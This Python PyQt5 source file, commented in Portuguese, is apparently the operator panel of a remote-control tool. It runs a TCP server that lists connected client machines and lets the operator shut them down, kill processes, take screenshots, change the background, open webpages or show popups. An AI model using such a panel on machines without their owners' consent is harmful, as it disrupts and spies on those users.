# ---------------------------------------------------- #
          # Public modules
# ---------------------------------------------------- #
import socket as ss
from threading import Thread
from time import sleep
from PyQt5.QtWidgets import QApplication, QMessageBox
from PyQt5 import QtWidgets, QtGui, QtCore
import sys
from pyautogui import alert

# ---------------------------------------------------- #
                  # My modules
# ---------------------------------------------------- #

from Interface.pato import Interface
from Interface.get_data_window import GetDataInterface
import Server as Coliseu


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
              # Main Aplication Class (M.A.C)
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #

class MAC(Interface):

# ---------------------------------------------------- #
        # Hosting server and setting configuration
# ---------------------------------------------------- #
    def __init__(self):
        super().__init__()

        self.geral = list()

        # Server configs
        self.point = ss.socket(ss.AF_INET, ss.SOCK_STREAM)
        self.point.bind((ss.gethostname(), 53361))
        self.point.listen(5)

        # Server vars
        self.conect = dict()
        self.ip = list()

        # Func get clients
        Thread(target=self.new_connection).start()

        # Func test connection
        Thread(target=self.connection_test).start()

        # Interface elements
        self.motive = ''
        self.iniar()
        self.slider_button_try.clicked.connect(self.slider_server_close_connection)
        self.PopUp_command.clicked.connect(self.thread_popup)
        self.shutdown_command.clicked.connect(self.thread_desligar)
        self.change_client_ip.clicked.connect(self.change_client_ipname)
        self.background_command.clicked.connect(self.thread_send_file)
        self.webpage_command.clicked.connect(self.thread_web)
        self.printscreen_command.clicked.connect(self.thread_print)
        self.kill_command.clicked.connect(self.thread_kill_command)

        if len(self.ip) == 0:
            self.IP_names.setText("")

        # Cliente sendo referido no moento
        self.usando = "None"
        Thread(target=self.click).start()

# ---------------------------------------------------- #
          # Execution Threads from Coliseu
# ---------------------------------------------------- #

    def thread_send_file(self):
        if self.usando != "None":
            final = self.take_photo()
            if final == "problem":
                self.justpop("Ocorreu um problema na busca da foto!")
            if final == "Error":
                pass
            else:
                Thread(target=Coliseu.send_file_, args=[self.usando[0], final[0], final[1]]).start()

        else:
            self.justpop("Selecione algum cliente!")

    def thread_desligar(self):
        if self.usando != "None":
            Thread(target=Coliseu.desligar, args=[self.usando[0]]).start()
        else:
            self.justpop("Selecione algum cliente!")

    def thread_popup(self):
        if self.usando != "None":
            self.motive = 'popup'
            self.get_data()
        else:
            self.justpop("Selecione algum cliente!")

    def thread_web(self):
        if self.usando != "None":
            self.motive = 'webweb'
            self.get_data()
        else:
            self.justpop("Selecione algum cliente!")

    def thread_print(self):
        if self.usando != "None":
            self.motive = 'printar'
            self.get_data()
        else:
            self.justpop("Selecione algum cliente!")

    def thread_kill_command(self):
        if self.usando != "None":
            self.motive = 'kill_command'
            self.get_data()
        else:
            self.justpop("Selecione algum cliente!")

# ---------------------------------------------------- #
                # Others Windows Stuff
# ---------------------------------------------------- #

    @staticmethod
    def justpop(msg):
        pop = QMessageBox()
        pop.setWindowTitle("Erro")
        pop.setText(msg)
        pop.setIcon(QMessageBox.Warning)
        pop.exec_()

    def get_data(self):
        self.call = GetDataInterface()
        self.call.show()
        self.call.put_photo.close()
        self.call.put_data.show()
        self.call.enviar_button.clicked.connect(self.return_capture_data)

    def return_capture_data(self):
        information = self.call.input_info.text()
        if information != "" and not "\n" in information and not "\\" in information:
            self.call.close()
            if self.motive == 'popup':
                Coliseu.popup(self.usando[0], information)
            if self.motive == "webweb":
                Thread(target=Coliseu.sit, args=[self.usando[0], information]).start()
            if self.motive == "printar":
                Thread(target=Coliseu.printt, args=[self.usando[0], information]).start()
            if self.motive == "change":
                Thread(target=Coliseu.change_name, args=[self.usando[0], information]).start()
            if self.motive == "kill_command":
                if not ".exe" in information:
                    Thread(target=Coliseu.kill_process, args=[self.usando[0], information]).start()
                else:
                    self.justpop("Coloque o nome do programa sem o '.exe'!")
        else:
            self.justpop("O dado inserido não é valido")

    @staticmethod
    def take_photo():
        try:
            photo = QtWidgets.QFileDialog.getOpenFileUrl()[0].url().split("/")
            photo.remove('file:')
            nome = photo[len(photo) - 1]
            for _ in range(0, photo.count('')):
                photo.remove('')
            dress = "\\".join(photo)
            return dress, nome
        except FileNotFoundError:
            return "problem"
        except FileExistsError:
            return "problem"
        except Exception:
            return "Error"

# ---------------------------------------------------- #
                # Client pick
# ---------------------------------------------------- #

    def click(self):
        while True:
            try:
                it = self.painel.currentItem()
                for ele in self.conect.keys():
                    if it == self.conect[ele][3]:
                        self.usando = [self.conect[ele][0], ele]
                        self.IP_names.setText(f"{ele} ({self.conect[ele][1]})")
            except Exception:
                self.IP_names.setText("")

# ---------------------------------------------------- #
                # Server Methods
# ---------------------------------------------------- #
    def slider_server_close_connection(self):
        if self.usando != "None":
            self.change()
            if self.real == 99:
                self.usando[0].close()
                self.justpop(f"{self.usando[1]} Desconectado!")
                self.change()
                self.IP_names.setText("")
                self.usando = "None"

        else:
            self.justpop("Selecione algum cliente!")

    def change_client_ipname(self):
        if self.usando != "None":
            self.motive = 'change'
            self.get_data()
        else:
            self.justpop("Selecione algum cliente!")

    def new_connection(self):
        while True:
            objj, ipp = self.point.accept()
            if not ipp[0] in self.ip:
                while True:
                    name = self.get_name(objj)
                    if name == "isdefault":
                        name = f"Default{len(self.conect)}"
                    if name != "" and name != "None" and not name in self.conect.keys():
                        self.conect[name] = [objj, ipp[0], ipp[1]]
                        self.new_connection_label(name)
                        self.ip.append(ipp[0])
                        self.IP_names.setText(f"{name} ({ipp[0]})")
                        break

    def new_connection_label(self, nome):
        self.conect[nome].append(QtWidgets.QListWidgetItem(nome))
        self.conect[nome][3].setTextAlignment(QtCore.Qt.AlignHCenter)
        font = QtGui.QFont()
        font.setPointSize(12)
        self.conect[nome][3].setFont(font)
        self.painel.addItem(self.conect[nome][3])
        self.geral.append(self.conect[nome][3])

    def connection_test(self):
        while True:
            try:
                for abcc, obj in self.conect.items():
                    try:
                        obj[0].send(bytes(1))
                    except ConnectionRefusedError:
                        Thread(target=self.desconection, args=(abcc, )).start()
                    except ConnectionAbortedError:
                        Thread(target=self.desconection, args=(abcc, )).start()
                    except ss.error:
                        Thread(target=self.desconection, args=(abcc, )).start()
                    sleep(1)
            except Exception:
                continue

    def desconection(self, name):
        try:
            item_index = self.geral.index(self.conect[name][3])
            self.painel.takeItem(item_index)
            self.painel.removeItemWidget(self.conect[name][3])
            self.geral.remove(self.conect[name][3])
            self.ip.remove(self.conect[name][1])
            del self.conect[name]
            alert(f"O cliente {name} foi desconectado!")
        except Exception:
            self.justpop(f"O cliente {name} se demonstra desconectado!")

    def get_name(self, ocliente):
        try:
            while True:
                info = ocliente.recv(1024)
                if info:
                    info = info.decode("utf-8")
                    return info
        except ConnectionRefusedError:
            Thread(target=self.desconection, args=(ocliente,)).start()
        except ConnectionAbortedError:
            Thread(target=self.desconection, args=(ocliente,)).start()
        except ss.error:
            Thread(target=self.desconection, args=(ocliente,)).start()
        except ConnectionResetError:
            Thread(target=self.desconection, args=(ocliente,)).start()


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
                        # Class End
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #


# ---------------------------------------------------- #
            # Init Program and Interface
# ---------------------------------------------------- #

if __name__ == "__main__":
    while True:
        try:
            app = QApplication(sys.argv)
            abc = MAC()
            abc.show()
            sys.exit(app.exec_())
        except AttributeError:
            continue
